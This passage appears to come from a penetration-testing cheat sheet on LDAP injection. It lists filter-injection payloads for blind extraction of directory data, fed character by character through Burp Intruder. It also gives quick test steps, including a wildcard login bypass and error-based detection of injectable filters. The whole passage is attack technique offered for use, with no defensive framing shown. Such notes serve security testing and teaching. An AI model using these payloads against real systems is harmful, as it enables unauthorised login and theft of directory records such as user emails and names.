## Blind data extraction (bit-by-bit, like SQLi)
Use Burp Intruder on `*)(companyName=X*` char-by-char similar to SQLi regex oracle:
```
*)(mail=admin@x*
*)((mail=admin@x*)  variant
```
Pattern: `*)(cn = A*` then `AB*` then `ABC*`... every correct char returns records.

## Fastest test requests
1. Login with `*` both fields.
2. If no bypass, intercept and fuzz `user` with the auth-bypass list above.
3. If filter returns error `Bad search filter` vs no error → filter is injectable (keep refining).
